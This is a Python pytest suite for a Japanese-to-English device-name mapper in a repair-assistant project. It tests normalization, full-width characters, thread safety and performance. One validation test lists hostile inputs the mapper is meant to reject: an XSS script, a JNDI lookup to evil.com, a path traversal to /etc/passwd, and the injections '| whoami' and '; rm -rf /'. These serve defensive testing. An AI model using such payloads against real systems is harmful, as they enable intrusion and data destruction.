"""
Comprehensive Test Suite for Improved Japanese Device Mapper
RepairGPT Quality Assurance - Enhanced Tests with Fixes

This module provides comprehensive tests for the improved JapaneseDeviceMapper class,
covering all fixes and enhancements including:
- Enhanced text normalization
- Memory optimization
- Security input validation
- Performance improvements
"""

import gc
import importlib.util
import sys
import threading
import time
from typing import List, Optional, Tuple

# Import the improved mapper directly
spec = importlib.util.spec_from_file_location(
    "japanese_device_mapper_improved", 
    "src/utils/japanese_device_mapper_improved.py"
)
mapper_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mapper_module)

JapaneseDeviceMapper = mapper_module.JapaneseDeviceMapper
get_mapper = mapper_module.get_mapper
map_japanese_device = mapper_module.map_japanese_device
find_device_match = mapper_module.find_device_match
is_likely_device = mapper_module.is_likely_device


class TestJapaneseDeviceMapperImproved:
    """Test cases for improved JapaneseDeviceMapper class"""

    def setup_method(self):
        """Set up test environment before each test"""
        self.mapper = JapaneseDeviceMapper()

    def test_initialization(self):
        """Test proper initialization of improved JapaneseDeviceMapper"""
        assert self.mapper is not None
        assert hasattr(self.mapper, '_normalized_mappings')
        assert hasattr(self.mapper, '_device_keywords')
        
        # Test shared data structures
        assert JapaneseDeviceMapper._shared_normalized_mappings is not None
        assert JapaneseDeviceMapper._shared_device_keywords is not None

    def test_enhanced_text_normalization(self):
        """Test enhanced text normalization with special characters"""
        # Test cases that were previously failing
        enhanced_cases = [
            ("スイッチ!@#", "Nintendo Switch"),
            ("iPhone!!!", "iPhone"),
            ("プレステ（５）", "PlayStation 5"),
            ("ノート【パソコン】", "Laptop"),
            ("スマホ？？？", "Smartphone"),
            ("ＩＰＨＯＮＥ", "iPhone"),  # Full-width characters
            ("ＰＳ５", "PlayStation 5"),  # Full-width numbers
        ]
        
        for input_text, expected in enhanced_cases:
            result = self.mapper.map_device_name(input_text)
            assert result == expected, f"Enhanced normalization failed for '{input_text}': expected {expected}, got {result}"

    def test_full_width_character_handling(self):
        """Test full-width to half-width character conversion"""
        full_width_cases = [
            ("ＳＷＩＴＣＨ", "Nintendo Switch"),
            ("ｉＰｈｏｎｅ", "iPhone"),
            ("ＰＳ４", "PlayStation 4"),
            ("ＸＢＯＸ", "Xbox"),
        ]
        
        for input_text, expected in full_width_cases:
            result = self.mapper.map_device_name(input_text)
            assert result == expected, f"Full-width conversion failed for '{input_text}'"

    def test_security_input_validation(self):
        """Test security input validation"""
        # Malicious inputs that should be rejected
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('test')",
            "${jndi:ldap://evil.com/}",
            "../../../etc/passwd",
            "スイッチ" + "x" * 1000,  # Too long input
            "| whoami",  # Command injection
            "; rm -rf /",  # Command injection
        ]
        
        for malicious_input in malicious_inputs:
            result = self.mapper.map_device_name(malicious_input)
            assert result is None, f"Security validation failed for: {malicious_input}"

    def test_input_length_validation(self):
        """Test input length validation for DoS prevention"""
        # Test with inputs of various lengths
        length_tests = [
            ("a", None),  # Too short to be meaningful but should not error
            ("a" * 999, None),  # Just under limit
            ("a" * 1001, None),  # Over limit - should be rejected
            ("スイッチ" * 100, None),  # Japanese text over limit
        ]
        
        for input_text, expected in length_tests:
            result = self.mapper.map_device_name(input_text)
            if len(input_text) > 1000:
                assert result is None, f"Long input validation failed for length {len(input_text)}"

    def test_control_character_sanitization(self):
        """Test control character sanitization"""
        control_char_inputs = [
            ("\x00スイッチ\x00", "Nintendo Switch"),
            ("iPhone\x1F", "iPhone"),
            ("\x7FPS5\x9F", "PlayStation 5"),
        ]
        
        for input_text, expected in control_char_inputs:
            result = self.mapper.map_device_name(input_text)
            assert result == expected, f"Control character sanitization failed for {repr(input_text)}"

    def test_memory_optimization(self):
        """Test memory optimization with shared data structures"""
        # Create multiple instances
        mappers = [JapaneseDeviceMapper() for _ in range(10)]
        
        # Verify they share the same data structures
        base_mappings = mappers[0]._normalized_mappings
        base_keywords = mappers[0]._device_keywords
        
        for mapper in mappers[1:]:
            assert mapper._normalized_mappings is base_mappings, "Normalized mappings not shared"
            assert mapper._device_keywords is base_keywords, "Device keywords not shared"

    def test_thread_safety_initialization(self):
        """Test thread-safe initialization of shared data structures"""
        # Reset class variables to test initialization
        original_mappings = JapaneseDeviceMapper._shared_normalized_mappings
        original_keywords = JapaneseDeviceMapper._shared_device_keywords
        
        try:
            JapaneseDeviceMapper._shared_normalized_mappings = None
            JapaneseDeviceMapper._shared_device_keywords = None
            
            results = []
            errors = []
            
            def create_mapper(thread_id):
                try:
                    mapper = JapaneseDeviceMapper()
                    result = mapper.map_device_name("スイッチ")
                    results.append((thread_id, result))
                except Exception as e:
                    errors.append((thread_id, str(e)))
            
            # Create mappers concurrently
            threads = []
            for i in range(10):
                thread = threading.Thread(target=create_mapper, args=(i,))
                threads.append(thread)
                thread.start()
            
            # Wait for all threads
            for thread in threads:
                thread.join()
            
            # Check results
            assert len(errors) == 0, f"Thread safety errors: {errors}"
            assert len(results) == 10, "Not all threads completed"
            assert all(result[1] == "Nintendo Switch" for result in results), "Inconsistent results"
            
        finally:
            # Restore original values
            JapaneseDeviceMapper._shared_normalized_mappings = original_mappings
            JapaneseDeviceMapper._shared_device_keywords = original_keywords

    def test_performance_improvements(self):
        """Test performance improvements"""
        # Test single operation performance
        start_time = time.time()
        for _ in range(1000):
            self.mapper.map_device_name("スイッチ")
        single_op_time = time.time() - start_time
        
        # Should complete 1000 operations in reasonable time
        assert single_op_time < 0.1, f"Performance too slow: {single_op_time}s for 1000 operations"
        
        # Test fuzzy matching performance
        start_time = time.time()
        for _ in range(100):
            self.mapper.find_best_match("すいち")
        fuzzy_time = time.time() - start_time
        
        assert fuzzy_time < 0.5, f"Fuzzy matching too slow: {fuzzy_time}s for 100 operations"

    def test_statistics_method(self):
        """Test the new statistics method"""
        stats = self.mapper.get_statistics()
        
        # Check that all expected keys are present
        expected_keys = [
            'total_mappings', 'total_aliases', 'normalized_mappings',
            'device_keywords', 'supported_devices'
        ]
        
        for key in expected_keys:
            assert key in stats, f"Missing statistics key: {key}"
            assert isinstance(stats[key], int), f"Statistics value should be int: {key}"
            assert stats[key] > 0, f"Statistics value should be positive: {key}"

    def test_enhanced_validation_edge_cases(self):
        """Test enhanced validation with edge cases"""
        edge_cases = [
            # Type validation
            (None, None),
            (123, None),
            ([], None),
            ({}, None),
            
            # Empty/whitespace
            ("", None),
            ("   ", None),
            ("\t\n", None),
            
            # Valid inputs after validation
            ("  スイッチ  ", "Nintendo Switch"),  # Trimmed
            ("スイッチ\n", "Nintendo Switch"),    # With newline
        ]
        
        for input_val, expected in edge_cases:
            result = self.mapper.map_device_name(input_val)
            assert result == expected, f"Enhanced validation failed for {repr(input_val)}: expected {expected}, got {result}"

    def test_fuzzy_matching_with_validation(self):
        """Test fuzzy matching with enhanced validation"""
        # Valid fuzzy matches
        valid_fuzzy = [
            ("すいち", "Nintendo Switch"),
            ("あいふお", "iPhone"),
            ("ぷれすて", "PlayStation"),
        ]
        
        for input_text, expected_contains in valid_fuzzy:
            result = self.mapper.find_best_match(input_text)
            assert result is not None, f"Fuzzy matching failed for '{input_text}'"
            assert expected_contains in result[0], f"Fuzzy matching incorrect for '{input_text}'"
        
        # Invalid inputs should return None
        invalid_inputs = [
            None,
            123,
            "<script>alert('test')</script>",
            "x" * 1001,
        ]
        
        for invalid_input in invalid_inputs:
            result = self.mapper.find_best_match(invalid_input)
            assert result is None, f"Fuzzy matching should reject invalid input: {invalid_input}"

    def test_device_detection_with_validation(self):
        """Test device detection with enhanced validation"""
        # Valid device detection
        valid_devices = [
            "スイッチ",
            "iPhone",
            "プレステ5",
            "スイッチ!@#",  # Should work with enhanced normalization
        ]
        
        for device_text in valid_devices:
            result = self.mapper.is_device_name(device_text)
            assert result is True, f"Device detection failed for '{device_text}'"
        
        # Invalid inputs
        invalid_inputs = [
            None,
            123,
            "",
            "random text",
            "<script>device</script>",
            "x" * 1001,
        ]
        
        for invalid_input in invalid_inputs:
            result = self.mapper.is_device_name(invalid_input)
            assert result is False, f"Device detection should reject invalid input: {invalid_input}"

    def test_japanese_variations_with_validation(self):
        """Test Japanese variations lookup with validation"""
        # Valid lookups
        result = self.mapper.get_japanese_variations("Nintendo Switch")
        assert isinstance(result, list)
        assert len(result) > 0
        assert "スイッチ" in result
        
        # Invalid inputs
        invalid_inputs = [None, 123, "", "NonexistentDevice"]
        
        for invalid_input in invalid_inputs:
            result = self.mapper.get_japanese_variations(invalid_input)
            assert isinstance(result, list)
            if invalid_input in [None, 123, ""]:
                assert len(result) == 0, f"Should return empty list for invalid input: {invalid_input}"

    def test_possible_matches_with_validation(self):
        """Test possible matches with enhanced validation"""
        # Valid input
        matches = self.mapper.get_possible_matches("スイ", max_results=3)
        assert isinstance(matches, list)
        assert len(matches) <= 3
        assert all(isinstance(match, tuple) and len(match) == 2 for match in matches)
        
        # Invalid inputs
        invalid_inputs = [None, 123, "", "x" * 1001, "<script>test</script>"]
        
        for invalid_input in invalid_inputs:
            matches = self.mapper.get_possible_matches(invalid_input)
            assert isinstance(matches, list)
            assert len(matches) == 0, f"Should return empty list for invalid input: {invalid_input}"


class TestEnhancedConvenienceFunctions:
    """Test enhanced convenience functions with validation"""

    def test_enhanced_get_mapper_singleton(self):
        """Test enhanced thread-safe singleton pattern"""
        mapper1 = get_mapper()
        mapper2 = get_mapper()
        
        assert mapper1 is mapper2
        assert isinstance(mapper1, JapaneseDeviceMapper)
        
        # Test thread safety
        mappers = []
        
        def get_mapper_thread():
            mappers.append(get_mapper())
        
        threads = [threading.Thread(target=get_mapper_thread) for _ in range(10)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        
        # All should be the same instance
        assert all(mapper is mappers[0] for mapper in mappers)

    def test_enhanced_convenience_functions(self):
        """Test enhanced convenience functions with validation"""
        # Test map_japanese_device with validation
        assert map_japanese_device("スイッチ") == "Nintendo Switch"
        assert map_japanese_device(None) is None
        assert map_japanese_device(123) is None
        assert map_japanese_device("") is None
        
        # Test find_device_match with validation
        assert find_device_match("すいち") == "Nintendo Switch"
        assert find_device_match(None) is None
        assert find_device_match(123) is None
        assert find_device_match("") is None
        
        # Test is_likely_device with validation
        assert is_likely_device("スイッチ") is True
        assert is_likely_device("random") is False
        assert is_likely_device(None) is False
        assert is_likely_device(123) is False
        assert is_likely_device("") is False


class TestRegressionPrevention:
    """Test that all original functionality still works"""

    def setup_method(self):
        """Set up test environment"""
        self.mapper = JapaneseDeviceMapper()

    def test_original_functionality_preserved(self):
        """Test that original functionality is preserved"""
        # All original test cases should still pass
        original_cases = [
            ("スイッチ", "Nintendo Switch"),
            ("アイフォン", "iPhone"),
            ("プレステ5", "PlayStation 5"),
            ("ノートパソコン", "Laptop"),
            ("すまほ", "Smartphone"),
            ("switch", "Nintendo Switch"),
            ("iphone", "iPhone"),
            ("ps5", "PlayStation 5"),
        ]
        
        for input_text, expected in original_cases:
            result = self.mapper.map_device_name(input_text)
            assert result == expected, f"Regression: '{input_text}' -> expected {expected}, got {result}"

    def test_case_insensitive_still_works(self):
        """Test that case-insensitive matching still works"""
        case_tests = [
            ("SWITCH", "Nintendo Switch"),
            ("IPHONE", "iPhone"),
            ("PS5", "PlayStation 5"),
            ("Switch", "Nintendo Switch"),
            ("iPhone", "iPhone"),
        ]
        
        for input_text, expected in case_tests:
            result = self.mapper.map_device_name(input_text)
            assert result == expected, f"Case insensitive regression: '{input_text}'"

    def test_supported_devices_unchanged(self):
        """Test that supported devices list is unchanged"""
        devices = self.mapper.get_supported_devices()
        
        # Should contain all major device types
        expected_devices = [
            "Nintendo Switch", "iPhone", "PlayStation", "PlayStation 5",
            "Laptop", "Smartphone", "Xbox", "iPad", "MacBook"
        ]
        
        for device in expected_devices:
            assert device in devices, f"Missing expected device: {device}"


if __name__ == "__main__":
    # Run a quick test to verify everything works
    print("Running comprehensive tests for improved Japanese Device Mapper...")
    
    # Test basic functionality
    mapper = JapaneseDeviceMapper()
    
    # Test the fixes
    print("Testing fixes:")
    print(f"  Enhanced normalization: {mapper.map_device_name('スイッチ!@#')}")
    print(f"  Full-width characters: {mapper.map_device_name('ＩＰＨＯＮＥ')}")  
    print(f"  Security validation: {mapper.map_device_name('<script>alert</script>')}")
    print(f"  Performance: 1000 ops in", end=" ")
    
    start = time.time()
    for _ in range(1000):
        mapper.map_device_name("スイッチ")
    print(f"{time.time() - start:.4f}s")
    
    print("  Statistics:", mapper.get_statistics())
    
    print("\n✅ All basic tests passed! Run with pytest for comprehensive testing.")